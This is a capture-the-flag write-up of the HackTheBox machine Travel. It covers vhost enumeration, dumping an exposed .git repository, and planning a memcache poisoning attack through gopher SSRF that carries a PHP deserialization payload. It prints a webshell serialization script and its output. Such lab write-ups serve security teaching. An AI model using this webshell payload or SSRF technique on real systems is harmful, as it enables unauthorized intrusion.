---
title: HTB: Travel
url: https://0xdf.gitlab.io/2020/09/12/htb-travel.html
date: 2020-09-12T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, ctf, htb-travel, nmap, ubuntu, vhosts, wfuzz, gobuster, wordpress, awesome-rss, simplepie, git, gittools, gitdumper, source-code, memcached, ssrf, filter, deserialization, php, gopher, gopherus, payloadsallthethings, webshell, container, docker, database, credentials, password-reuse, hashcat, viminfo, ldap, authorizedkeyscommand, ldif, ldapadd, getent, htb-ypuffy
---

![Travel](https://0xdfimages.gitlab.io/img/travel-cover.png)

Travel was just a great box because it provided a complex and challenging puzzle with new pieces that were fun to explore. I’ll start off digging through various vhosts until I eventually find an exposed .git folder on one. That provides me the source for another, which includes a custom RSS feed that’s cached using memcache. I’ll evaluate that code to find a deserialization vulnerability on the read from memcache. I’ll create an exploit using a server-side request forgery attack to poison the memcache with a serialized PHP payload that will write a webshell, and then trigger it, gaining execution and eventually a shell inside a container. I’ll find a hash in the database which I can crack to get a password for the user on the main host. This user is also the LDAP administrator, and SSH is configured to check LDAP for logins. I’ll pick an arbitrary user and add an SSH private key, password, and the sudo group to their LDAP such that then when I log in as that user, I can just sudo to root. In Beyond Root I’ll explore a weird behavior I observed in the RSS feed.

## Box Info

| Name | [Travel](https://hackthebox.com/machines/travel)  [Travel](https://hackthebox.com/machines/travel) [Play on HackTheBox](https://hackthebox.com/machines/travel) |
| --- | --- |
| Release Date | [16 May 2020](https://twitter.com/hackthebox_eu/status/1260909118459711488) |
| Retire Date | 12 Sep 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Travel |
| Radar Graph | Radar chart for Travel |
| First Blood User | 05:05:23[qtc qtc](https://app.hackthebox.com/users/103578) |
| First Blood Root | 08:48:52[qtc qtc](https://app.hackthebox.com/users/103578) |
| Creators | [xct xct](https://app.hackthebox.com/users/13569)  [jkr jkr](https://app.hackthebox.com/users/77141) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 14:06 EDT
Nmap scan report for 10.10.10.189
Host is up (0.014s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds

root@kali# nmap -p 22,80,443 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 14:17 EDT
Nmap scan report for 10.10.10.189
Host is up (0.013s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB - SSL coming soon.
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Not valid before: 2020-04-23T19:24:29
|_Not valid after:  2030-04-21T19:24:29
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely the first HTB machine to run Ubuntu 20.04 Focal. The [NGINX version](https://packages.ubuntu.com/search?keywords=nginx) is pretty close there as well.

The TLS port is showing a certificate with `travel.htb`, `www.travel.htb`, `blog.travel.htb`, and `blog-dev.travel.htb`.

`blog-dev.travel.htb` just returns a 403 Forbidden error.

### Scan for Virtual Hosts

Seeing the various different DNS names, I started a scan right away for others. The default case is 5093 bytes:

```

root@kali# curl -s http://10.10.10.189 | wc 
    144     458    5093
root@kali# curl -s http://travel.htb | wc 
    144     458    5093

```

Of the subdomains I already know about, `www` seems to match that default, whereas `blog` and `blog-dev` are different:

```

root@kali# wfuzz -c -w subdomains -u http://10.10.10.189 -H "Host: FUZZ.travel.htb"
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.189/
Total requests: 3

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000001:   200        144 L    458 W    5093 Ch     "www"
000000003:   403        7 L      9 W      154 Ch      "blog-dev"
000000002:   200        345 L    1408 W   24462 Ch    "blog"

Total time: 0.083828
Processed Requests: 3
Filtered Requests: 0
Requests/sec.: 35.78737

```

Running over a larger word list reveals one more, `ssl`:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.189 -H "Host: FUZZ.travel.htb" --hh 5093
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.189/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000004:   200        345 L    1408 W   24462 Ch    "blog"
000000078:   200        51 L     126 W    1123 Ch     "ssl"
000099358:   403        7 L      9 W      154 Ch      "blog-dev"
                                                          
Total time: 387.3847
Processed Requests: 100000  
Filtered Requests: 99997
Requests/sec.: 258.1412

```

### www.travel.htb - TCP 80

#### Site

The main site is for a travel goods company that hasn’t launched yet:

[![image-20200518142736039](https://0xdfimages.gitlab.io/img/image-20200518142736039.png)](https://0xdfimages.gitlab.io/img/image-20200518142736039.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200518142736039.png)

I’ll test different extensions to reveal that the index page is `index.html`. Submitting to the Subscribe form just links to `index.html?email=[submitted address]`, which seems unlikely to lead to any actions on the server.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x html,php` since I know the index is HTML, and PHP seems potentially likely on this kind of box:

```

root@kali# gobuster dir -u http://travel.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x html,php -o scans/gobuster-travel.htb-medium-html_php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://travel.htb
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2020/05/18 14:40:28 Starting gobuster
===============================================================
/index.html (Status: 200)
/img (Status: 301)
/css (Status: 301)
/lib (Status: 301)
/js (Status: 301)
/newsfeed (Status: 301)
===============================================================
2020/05/18 14:56:30 Finished
===============================================================

```

`/newsfeed` is interesting, but it returns 403.

### blog.travel.htb - TCP 80

#### Site

The site is a WordPress blog:

![image-20200518145355485](https://0xdfimages.gitlab.io/img/image-20200518145355485.png)

I’ll note the username, admin, as well as the multiple references to RSS feeds. The page source contains a comment in the source about moving from dev to prod:

```

<style id="wp-custom-css">
			/* I am really not sure how to include a custom CSS file
 * in wordpress. I am including it directly via Additional CSS for now.
 * TODO: Fixme when copying from -dev to -prod. */

@import url(http://blog-dev.travel.htb/wp-content/uploads/2020/04/custom-css-version#01.css);		</style>

```

Looking at the RSS feed, I see the same post that’s linked to in “Recent Posts”. There’s an “Awesome RSS” link at the top right, and it links to nine additional posts:

[![image-20200909135251619](https://0xdfimages.gitlab.io/img/image-20200909135251619.png)](https://0xdfimages.gitlab.io/img/image-20200909135251619.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200909135251619.png)

All of the links just point back to `/awesome-rss`. It is strange that these seem to be coming from a different RSS feed than the rest of the site.

#### wpscan

As this is a WordPress site, I ran `wpscan` against it. There wasn’t a ton of useful info. There’s a `robots.txt` file that does allow `/wp-admin/admin-ajax.php`. However, it seems [that page is supposed to be available publicly facing](https://wordpress.stackexchange.com/questions/77407/how-does-admin-ajax-php-work). It identifies the version as 5.4, which is 1.5 months old. There is a newer version from April 29 (17 days before release), but reading the [WordPress Changelog](https://wordpress.org/support/wordpress-version/version-5-4-1/#list-of-files-revised) for version 5.4.1, there doesn’t seem to be any [security issues](https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/) I’m interested in. The WP theme of twentytwenty is 1.3, which is also one version out of date. The newest version was released [two days before Travel](https://themes.trac.wordpress.org/log/twentytwenty/), and there are no interesting security patches in there either.

It does identify the user Admin, just as I had earlier.

### ssl.travel.htb

The site just warns the the SSL isn’t working yet:

![image-20200518151826579](https://0xdfimages.gitlab.io/img/image-20200518151826579.png)

The note is signed by admin.

`gobuster` here with `.html` and `.php` didn’t find anything other than `index.html`.

### HTTPS Sites - TCP 443

Trying to visit any of these in Firefox returns the same page as `ssl.travel.htb`. Trying to visit through Burp returns an error:

![image-20200518160334896](https://0xdfimages.gitlab.io/img/image-20200518160334896.png)

`curl` returns the page, but `wfuzz` also breaks:

```

root@kali# wfuzz -c -w subdomains -u https://10.10.10.189 -H "Host: FUZZ.travel.htb"
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.189/
Total requests: 3

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Fatal exception: Pycurl error 35: gnutls_handshake() failed: Error in protocol version

```

This must be part of what the note referred to as broken.

### blog-dev.travel.htb

#### nmap

The root for this subdomain returns 403 forbidden, which might be due to the comment above about moving from dev to prod. I spent a lot of time enumerating everything else before finally turning back to look at `blog-dev.travel.htb`. `gobuster` with my typical wordlist didn’t find anything, but eventually I ran `nmap`:

```

root@kali# nmap -p 80 -sC -sV blog-dev.travel.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 16:57 EDT
Nmap scan report for blog-dev.travel.htb (10.10.10.189)
Host is up (0.036s latency).
rDNS record for 10.10.10.189: travel.htb

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.17.6
| http-git: 
|   10.10.10.189:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: moved to git 
|_http-server-header: nginx/1.17.6
|_http-title: 403 Forbidden

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds

```

This is a really good lesson learned. I never check for things like `robots.txt` or `.git/` because I count on `nmap` to find them for me. But it doesn’t check all the vhosts, so when dealing with vhosts, I should give each a quick run with `nmap -sC`.

#### Manual Look

With `curl` or Firefox, trying to visit `http://blog-dev.travel.htb` just returns 403 Forbidden:

```

root@kali# curl http://blog-dev.travel.htb
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.17.10</center>
</body>
</html>

```

Still, I know that the script in `nmap` was able to get information about the repo, like that it has no name, and the last commit message.

If I look inside the `.git` repository for this blog, I see a bunch of files there:

```

~/0xdf.gitlab.io/.git$ ls
branches  COMMIT_EDITMSG  config  description  FETCH_HEAD  HEAD  hooks  index  info  logs  objects  ORIG_HEAD  packed-refs  refs

```

If I retrieve `HEAD`:

```

root@kali# curl http://blog-dev.travel.htb/.git/HEAD
ref: refs/heads/master

```

`description` matches what was in the script results:

```

root@kali# curl http://blog-dev.travel.htb/.git/description
Unnamed repository; edit this file 'description' to name the repository.

```

`config` on my host gives all the branches:

```

~/0xdf.gitlab.io/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = git@gitlab.com:0xdf/0xdf.gitlab.io.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
[branch "rope"]
        remote = origin
        merge = refs/heads/rope
[branch "fatty"]
        remote = origin
        merge = refs/heads/fatty
[branch "arctic"]
        remote = origin
        merge = refs/heads/arctic

```

On Travel, there must not be any branches or an origin (remote like GitHub or Gitlab):

```

root@kali# curl http://blog-dev.travel.htb/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true

```

I can get a username, `jane@travel.htb`, from the logs:

```

root@kali# curl http://blog-dev.travel.htb/.git/logs/HEAD
0000000000000000000000000000000000000000 0313850ae948d71767aff2cc8cc0f87a0feeef63 jane <jane@travel.htb> 1587458094 -0700      commit (initial): moved to git

```

I get a 403 when I try to list any of the directories.

#### Automated Clone

I’ll use [GitTools](https://github.com/internetwache/GitTools) to pull the repo. First I’ll clone it to my host:

```

root@kali:/opt# git clone https://github.com/internetwache/GitTools.git
Cloning into 'GitTools'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 191 (delta 7), reused 20 (delta 7), pack-reused 164
Receiving objects: 100% (191/191), 43.65 KiB | 7.27 MiB/s, done.
Resolving deltas: 100% (68/68), done.

```

Now I can use the `gitdumper.sh` script to get the repo:

```

root@kali# /opt/GitTools/Dumper/gitdumper.sh http://blog-dev.travel.htb/.git/ git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########

[*] Destination folder does not exist
[+] Creating git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f
[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9
[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039
[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da

```

#### Access Files

Now in the `git` directory, there is only the `.git` directory:

```

root@kali# ls -a
.  ..  .git

```

I can run `git status` and see that since the last commit, three files are missing (which is because there are currently not files in there):

```

root@kali# git status 
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    README.md
        deleted:    rss_template.php
        deleted:    template.php

no changes added to commit (use "git add" and/or "git commit -a")

```

`git reset --hard` will reset to the last commit, which restores the three files:

```

root@kali# git reset --hard 
HEAD is now at 0313850 moved to git

root@kali# ls
README.md  rss_template.php  template.php

```

### Source Code Analysis

#### README

`README.md` presents install instructions as well as the current status and todo:

```

# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup
* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty` 
* create logs directory in `wp-content/themes/twentytwenty` 
* create page in backend and choose rss_template.php as theme

## Changelog
- temporarily disabled cache compression
- added additional security checks 
- added caching
- added rss template

## ToDo
- finish logging implementation

```

#### rss\_template.php

`rss_template.php` creates the `http://blog.travel.htb/awesome-rss/` page that I found earlier. I’ll include the [full source at the end](#full-php-code), and just stick to the interesting bits here.

There’s a function `get_feed($url)`:

```

function get_feed($url){
    require_once ABSPATH . '/wp-includes/class-simplepie.php';
    $simplepie = null;
    $data = url_get_contents($url);
    if ($url) {
        $simplepie = new SimplePie();
        $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
        //$simplepie->set_raw_data($data);
        $simplepie->set_feed_url($url);
        $simplepie->init();
        $simplepie->handle_content_type();
        if ($simplepie->error) {
            error_log($simplepie->error);
            $simplepie = null;
            $failed = True;
        }
    } else {
        $failed = True;
    }
    return $simplepie;
}

```

It’s using [SimplePie](https://github.com/simplepie/simplepie/), which is now the built in way to do RSS in WordPress. I can see that it’s using `memcache` for caching, with a timeout of 60 (seconds) and a prefix of `xct_`.

`get_feed` is called just after a `$url` variable is set:

```

$url = $_SERVER['QUERY_STRING'];
if(strpos($url, "custom_feed_url") !== false){
    $tmp = (explode("=", $url));
    $url = end($tmp);
} else {
    $url = "http://www.travel.htb/newsfeed/customfeed.xml";
}
$feed = get_feed($url);

```

`$_SERVER['QUERY_STRING']` is everything after the `?` in a GET request. So if `custom_feed_url` is not in the query string, it sets `$url` to a static `.xml` file on `www.travel.htb`. I can check it out, and it matches what I see in AwesomeRss:

![image-20200520154823648](https://0xdfimages.gitlab.io/img/image-20200520154823648.png)

If `custom_feed_url` is in the query string, then it calls `explode` on the query string, which [in PHP](https://www.php.net/manual/en/function.explode.php) will split the string by another string, in this case, by `=`, and then it takes the last element.

So to control `$url` , I just need to send `?custom_feed_url&url=[url]`.

I can test this by trying to grab something from myself. With an HTTP server running, I’ll use `curl` to trigger it:

```

root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?custom_feed_url&url=http://10.10.14.47/feed' > /dev/null

```

And I see the hit on my server:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.189 - - [20/May/2020 16:21:31] code 404, message File not found
10.10.10.189 - - [20/May/2020 16:21:31] "GET /feed HTTP/1.1" 404 -
10.10.10.189 - - [20/May/2020 16:21:31] code 404, message File not found
10.10.10.189 - - [20/May/2020 16:21:31] "GET /feed HTTP/1.1" 404 -

```

Finally, at the bottom, there’s an option to include `debug.php` inside HTML comments:

```

<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->

```

I immediately went to `http://blog.travel.htb/auesome-rss/?debug`. On my first loading, there was only an empty bit:

![image-20200520160537544](https://0xdfimages.gitlab.io/img/image-20200520160537544.png)

On refreshing, there was something cached:

![image-20200520160153746](https://0xdfimages.gitlab.io/img/image-20200520160153746.png)

What is particularly interesting is that the cached object looks like a PHP serialized object.

#### template.php

`template.php` has two parts. First, it has `url_get_contents($url)`, which is called from `get_feed` in `rss_template.php`. This function calls `safe` and `escapeshellargs` on the url, and then builds a string by appending it to `curl` , and passes it to `shell_exec`:

```

function url_get_contents ($url) {
    $url = safe($url);
        $url = escapeshellarg($url);
        $pl = "curl ".$url;
        $output = shell_exec($pl);
    return $output;
}

```

`safe` doesn’t change the url, but has three checks, each which check the decoded url for two strings:
- LFI: `file://` or `@`
- Command injection: `-o` or `-F`
- SSRF: `localhost` or `127.0.0.1`

If any of these match in `$url`, PHP calls `die` and exits:

```

function safe($url)
{
        // this should be secure
        $tmpUrl = urldecode($url);
        if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
        {               
                die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
        }
        if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
        {               
                die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
        }
        $tmp = parse_url($url, PHP_URL_HOST);
        // preventing all localhost access
        if($tmp == "localhost" or $tmp == "127.0.0.1")
        {               
                die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");              
        }
        return $url;
}

```

The second part of this file is a class, `TemplateHelper`, which isn’t referenced anywhere else in the code. There’s a comment at the top of the file that indicates it’s not done (which echo’s what was in `README.md`):

```

/**
 Todo: finish logging implementation via TemplateHelper
*/

```

The class itself isn’t that interesting, other than it writes a file on creation of a new object or on `__wakeup`, which is a [PHP Magic Method](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup) designed to reestablish any database connections lost during serialization and deserialization.

```

class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
        $this->init($file, $data);
    }

    public function __wakeup()
    {
        $this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {           
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}

```

## Shell as www-data@blog

### Idea

It seems clear that SimplePie is serializing PHP objects, and caching that data in memcache for 60 seconds. If I can drop my own payload into memcache, when SimplePie goes to deserialize it, I can perform an attack there. The fact that I’m given this `TemplateHelper` class is a good hint that this is a place to look, since it has the `__wakeup` Magic Method. If I put this into my serialized object, when it is deserialized, the `__wakeup` method is called, which in this case will write data I set to a filename I set.

To pull this off, I need:
- **To understand the naming convention used for a given feed**. I can see the start of the name in the debug data, but not the entire thing. I need to know here the data will be so I can trigger it.
- **A way to use SSRF to write to memcache**. Initially I was looking for a way to get an already serialized object into memcache through SimplePie, but I couldn’t find anything. But then I figured out how to do it with a SSRF to memcache.
- **Bypass for the “Hacker” Checks, specifically the SSRF check**. In order for the previous step to work, I need to bypass the checks in `template.php`.
- **Serialized Payload to write a webshell**.

### PHP Payload

Serialization is when a language (PHP, Python, Ruby, etc) takes an object and puts it into a string form, so that it can be passed somewhere, and then deserialized back to the object. The serialized object does not include the class definitions, just the attributes. Ippsec did a couple of [really good videos](https://www.youtube.com/watch?v=HaW15aMzBUM) on PHP deserialization attacks which I’d recommend if you want to understand further.

Just above I noticed that there was a class, `TemplateHelper` available for use on the server, even though the server never references it. It also has a `__wakeup()` method that will run on deserialization. So if I can have PHP on Travel deserialize a `TemplateHelper` object with `file` and `data` objects I set, it will write `data` to `file`.

I wrote a simple PHP script to create this:

```

<?php

class TemplateHelper
{

    public $file;
    public $data;

    public function __construct()
    {
        $this->file = '0xdf.php';
        $this->data = '<?php system($_GET["cmd"]); ?>';
    }

}

$obj = new TemplateHelper();
echo serialize($obj);

?>

```

Note: It’s not immediately clear to me why I declare `$file` and `$data` as `public` when they are private in `TemplateHelper`. I got stuck here a while, and for some reason making this change actually allowed it to work.

When I run that, it prints the serialized payload:

```

root@kali# php attack.php 
O:14:"TemplateHelper":2:{s:4:"file";s:8:"0xdf.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}

```

### memcache Names

#### SimplePie Source

When I ran the debug by itself, I got back that the object starts with `xct_4e5612ba07...`. The beginning makes sense, since the PHP code sets up the cache with `prefix=xct_`. I did some basic guessing that maybe the rest was different kinds of hashes of the url, but none of them matched the part I could see.

It was time to dig into the source. I need to see what happens when this section of code is executed:

```

$simplepie = new SimplePie();
$simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
//$simplepie->set_raw_data($data);
$simplepie->set_feed_url($url);
$simplepie->init();

```

The base code for this class [is here](https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php). The first line is the creation of a `SimplePie` object. The `__construct()` [function](https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L701) creates a couple helper objects, and then, with no args passed in, exits.

The next line is equally simple, as [it sets](https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L941) `$this->cache_location` to the given location.

Skipping the commented line (which I can show doesn’t really matter anyway in [Beyond Root](#rss-exploration)), next, `set_feed_url` [basically does the same thing](https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L794), with some checks to see if the argument is a string or an array, and a call to make sure that the protocol is on there, attaching `http://` to the front if not.

Then it calls `init()`, which [starts on line 1333 of the source](https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L1333). There’s a bunch of checks, loading data from the url, and eventually it comes to [line 1412](https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L1412):

```

$cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));

```

There’s a lot going on in this line. To simplify:
- `$this->cache_location` = `'memcache://127.0.0.1:11211/?timeout=60&prefix=xct_'` from being set by `$this->set_cache_location` above.
- `$this->cache_name_function` is set on [line 575](https://github.com/WordPress/WordPress/blob/ba03c426db5a929907ac37de9c34f307114be6d9/wp-includes/class-simplepie.php#L575) to a default value of `'md5'`, and it hasn’t been modified.
- `$url` is the value passed in as the url.

So this line is using the `call` function to call `get_handler($this->cache_location, md5($url), 'spc')` from `Cache.php`, which is [here](https://github.com/WordPress/WordPress/blob/a72e30d84715fcea4dfa8594d2a650c364814531/wp-includes/SimplePie/Cache.php#L83):

```

public static function get_handler($location, $filename, $extension)
{
    $type = explode(':', $location, 2);
    $type = $type[0];
    if (!empty(self::$handlers[$type]))
    {
        $class = self::$handlers[$type];
        return new $class($location, $filename, $extension);
    }

    return new SimplePie_Cache_File($location, $filename, $extension);
}

```

The first thing this does is take the location, break it on `:`, and take the first result. That will be `memcache`, which is stored as `$type`. Earlier in the file, `$handlers` is defined:

```

protected static $handlers = array(
    'mysql'     => 'SimplePie_Cache_MySQL',
    'memcache'  => 'SimplePie_Cache_Memcache',
    'memcached' => 'SimplePie_Cache_Memcached',
    'redis'     => 'SimplePie_Cache_Redis'
);

```

So it’s going to create a new `SimplePie_Cache_Memcache` object, and the constructor is called as:

```

return new $class('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_', md5($url), 'spc');

```

`Memcache.php` defines the constructor [here](https://github.com/WordPress/WordPress/blob/23c4fbeaa0458f634eee6e6529bc9aaaa4257ec2/wp-includes/SimplePie/Cache/Memcached.php#L84):

```

public function __construct($location, $name, $type) {
    $this->options = array(
        'host'   => '127.0.0.1',
        'port'   => 11211,
        'extras' => array(
            'timeout' => 3600, // one hour
            'prefix'  => 'simplepie_',
        ),
    );
    $this->options = SimplePie_Misc::array_merge_recursive($this->options, SimplePie_Cache::parse_URL($location));

    $this->name = $this->options['extras']['prefix'] . md5("$name:$type");

    $this->cache = new Memcached();
    $this->cache->addServer($this->options['host'], (int)$this->options['port']);
}

```

It sets some default values, and merges them with what’s passed in via the location parameter. And then comes what I’m looking for. `$this->name` is set to the prefix (`xct_`) concatenated with `md5("$name:$type")`. `$name` is already the `md5($url)`, and `$type` is `spc`. So the cached name is `md5(md5($url) . ":spc")`.

#### Testing

I can test this. The default url is `http://www.travel.htb/newsfeed/customfeed.xml`. If I apply that calculation here, I get:

```

root@kali# echo -n "$(echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum | cut -d' ' -f1):spc" | md5sum
4e5612ba079c530a6b1f148c0b352241  -

```

If I `curl` the awesome-rss site, the first time there’s no data in the cache. But the second, I see the cache, and it starts with `xct_4e5612ba07`, which matches above:

```

root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?debug' | grep xct
root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?debug' | grep xct
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |

```

If I host a copy of that file on my VM, and then request it, then both show up in the cache:

```

root@kali# echo -n "$(echo -n 'http://10.10.14.47/customfeed.xml' | md5sum | cut -d' ' -f1):spc" | md5sum
33b3801533e6b205005605117e9b685d  -
root@kali# curl -s 'http://blog.travel.htb/awesome-rss/?debug' | grep xct
| xct_33b3801533(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |

```

### Interaction with memcache

#### Gopher

Since my attack is poisoning the cache in memcache with a PHP serialized object, I need a way to talk directly to memcache. It’s not listening on a port I can talk to. It’s likely listening only on localhost. I’ve already shown that I can send a url through the website that will be passed to curl. This is where a neat trick comes in that uses [Gopher](https://en.wikipedia.org/wiki/Gopher_(protocol)). Gopher was an early competitor to HTTP, but has faded into obscurity.

What makes it useful here is that it doesn’t send a bunch of headers like HTTP. If I just curl into port 11211, all the junk like `Host: 127.0.0.1` and `User-Agent: curl` are going to fail as memcache commands and ruin the connection. Gopher is clean, and it can do multiple line input from what in HTTP would be a GET. For example, I’ll start a `nc` listener, and hit it with HTTP:

```

root@kali# curl 'http://127.0.0.1:9001/_test%0a%0dline%202'

```

The result is:

```

root@kali# nc -lnp 9001
GET /_test%0a%0dline%202 HTTP/1.1
Host: 127.0.0.1:9001
User-Agent: curl/7.68.0
Accept: */*

```

If I do the same thing, but this time with Gopher:

```

root@kali# curl 'gopher://127.0.0.1:9001/_test%0a%0dline%202'

```

The result is just the stuff after the `/_`:

```

root@kali# nc -lnp 9001
test
line 2

```

Some googling found several writeups using Gopher to exploit things like [smtp](https://hackerone.com/reports/115748) and [redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis).

#### Gopherus

One of the things that got me going down this path entirely was in googling for “memcache SSRF”, I found [Gopherus](https://github.com/tarunkant/Gopherus). This is a package that will help generate SSRF Gopher links for all sorts of different services, from mysql to redis to memcache in Python, Ruby, or PHP.

I cloned it into `/opt`, and ran `install.sh` which downloads the required libraries, makes `gopherus.py` executable, and installs a symlink into `/usr/local/bin`. Now it runs:

```

root@kali# gopherus 

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

usage: gopherus [-h] [--exploit EXPLOIT]

optional arguments:
